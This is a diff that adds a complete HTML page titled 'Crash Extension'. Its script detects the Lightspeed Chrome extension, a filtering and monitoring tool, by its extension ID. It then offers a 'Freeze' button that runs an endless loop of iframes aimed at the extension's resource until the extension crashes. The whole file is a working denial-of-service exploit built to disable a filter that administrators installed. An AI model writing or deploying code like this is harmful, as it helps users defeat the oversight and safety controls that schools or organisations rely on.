@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Crash Extension</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script>
+      let from_id = id => document.getElementById(id);
+      let extensions = {
+        "lighspeed": {
+          name: "Lightspeed",
+          url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"
+        }
+      };
+
+      async function check_url(url) {
+        let controller = new AbortController();
+        let timeout = setTimeout(() => controller.abort(), 500);
+
+        try {
+          await fetch(url, {signal: controller.signal});
+          return true;
+        }
+        catch (error) {
+          let error_msg = error+"";
+          return error_msg.includes("AbortError");
+        }
+      }
+      
+      async function detect_extensions() {
+        let detected = [];
+        for (let extension of Object.values(extensions)) {
+          let exists = await check_url(extension.url);
+          if (exists) {
+            detected.push(extension);
+          }
+        }
+        return detected;
+      }
+
+      async function main() {
+        let detected = await detect_extensions();
+        let buttons_container = from_id("buttons_container")
+
+        buttons_container.innerHTML = ""
+
+        for (let extension of detected) {
+          let button = document.createElement("button");
+          button.innerText = `Freeze ${extension.name}`;
+          button.onclick = () => {
+            button_handler(extension);
+          }
+          buttons_container.append(button);
+        }
+      }
+
+      function button_handler(extension) {
+        let cancel = !confirm("Start crash? (Crash will start in 5 seconds after confirmation)");
+        if (cancel) return;
+        
+        setTimeout(() => {
+          create_iframes(extension);
+        }, 5000);
+      }
+
+      function create_iframes(extension) {
+        let iframes = []
+        let iterations = 5;
+        let public_url = extension.url;
+        
+        while (true) {
+          let iframe = document.createElement("iframe");
+          document.body.append(iframe);
+          iframes.push(iframe);
+
+          for (let i=0; i<50; i++) {
+            let subframe = document.createElement("iframe");
+            subframe.src = public_url;
+            subframe.style.width = subframe.style.height = "1px";
+            iframe.contentDocument.body.append(subframe);
+          }
+
+          while (iframes.length > Math.max(3, 10-iterations)) {
+            iframes[0].remove();
+            iframes.shift();
+          }
+
+          iterations++;
+        }
+      }
+
+      window.onload = main;
+    </script>
+  </head>
+  <body>
+
+    
+      <div id="buttons_container">
+      </div>
+  </body>
+</html>
